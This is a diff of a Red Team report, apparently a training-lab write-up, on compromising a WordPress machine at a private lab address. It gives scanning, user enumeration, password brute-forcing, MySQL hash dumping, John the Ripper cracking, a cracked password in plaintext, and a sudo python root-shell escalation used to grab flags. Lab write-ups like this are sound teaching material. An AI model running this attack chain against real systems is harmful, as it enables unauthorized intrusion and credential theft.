@@ -10,8 +10,8 @@ _TODO: Fill out the information below._
 
 Nmap scan results for each machine reveal the below services and OS details:
 
-$ nmap -sV 192.168.1.110
-  # TODO: Insert scan output
+`$ nmap -sV 192.168.1.110`
+  <img src="/Images/NMAP-scan.png">
 
 This scan identifies the services below as potential points of entry:
 **Target 1**
@@ -43,7 +43,9 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
     - Command: 
         - `$ wpscan --url http://192.168.1.110 --enumerate u`
 
-![WPScan results](/Images/nmap-scan-results.png "WPScan results")
+
+<img src="/Images/wpscan-users.png">
+<img src="/Images/flag1.png">
 
 - Targeting user Michael
     - Brief manual Brute Force attack to guess/finds Michael’s password
@@ -61,9 +63,10 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
     - **Exploit Used**
       - Same SSH exploit for user Michael leveraged in the 1st exploit
       - Simple directory exploration found the 'flag2.txt' file plainly visible in the /var/www/ directory.
-      - cd /var/www/
-      - ls -l
-      - cat flag2.txt
+      - `cd /var/www/`
+      - `ls -l`
+      - `cat flag2.txt`
+<img src="/Images/flag2.png">
 
 - **Flag3: afc01ab56b50591e7dccf93122770cd2**
 - Exploit Used:
@@ -76,6 +79,8 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
             - `use wordpress;` 
             - `show tables;`
             - `select * from wp_posts;`
+
+<img src="/Images/flag3.png">
 
 
 - **Flag4: 715dea6c055b9fe3337544932f2941ce**
@@ -91,20 +96,26 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
                 - `show tables;`
                 - `select * from wp_users;`
 
-        - ![wp_users table](/Images/wpusers-table.png "wp_users table")
+        - <img src="/Images/mysql-users.png">
 
         - On the Kali local machine the wp_hashes.txt was run against John the Ripper to crack the hashes. 
             - Command:
                 - `john wp_hashes.txt`
 
-        - ![John the Ripper results](/Images/john-results.png "John the Ripper results")
+        - <img src="/Images/John-show.png">
 
-        - Once Steven’s password hash was cracked, the next thing to do was SSH as Steven. Then as Steven checking for privilege and escalating to root with Python
-            - Commands: 
-                - `ssh steven@192.168.1.110`
-                - `pw:pink84`
-                - `sudo -l`
-                - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
-                - `cd /root`
-                - `ls`
-                - `cat flag4.txt`
+      	  	- Once Steven’s password hash was cracked, the next thing to do was SSH as Steven. Then as Steven checking for privilege and escalating to root with Python
+           		 - Commands: 
+               			 - `ssh steven@192.168.1.110`
+               			 - `pw:pink84`
+               			 - `sudo -l`
+               			 - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
+                			- `cd /root`
+               			 - `ls`
+               			 - `cat flag4.txt`
+
+		- Python Escalate
+			- <img src="/Images/python-escalate.png">
+
+- **FLAG 4**
+<img src="/Images/flag4.png">
